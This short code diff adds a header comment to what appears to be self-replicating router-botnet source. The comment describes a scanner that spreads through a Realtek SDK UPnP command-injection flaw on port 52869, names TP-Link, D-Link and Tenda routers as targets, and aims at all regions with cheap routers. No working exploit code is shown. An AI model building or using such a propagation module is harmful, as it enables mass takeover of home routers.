@@ -1,5 +1,14 @@
 #ifdef SELFREP
 
+/* ============================================================================
+ * REALTEK SCANNER - UPnP Command Injection (Port 52869)
+ * ============================================================================
+ * Exploit: Realtek SDK UPnP AddPortMapping RCE
+ * Targets: SOHO routers with Realtek chips (TP-Link, D-Link, Tenda)
+ * Method: SOAP XML command injection
+ * Global: All regions with cheap router deployments
+ * ============================================================================ */
+
 #pragma once
 
 #include <stdint.h>
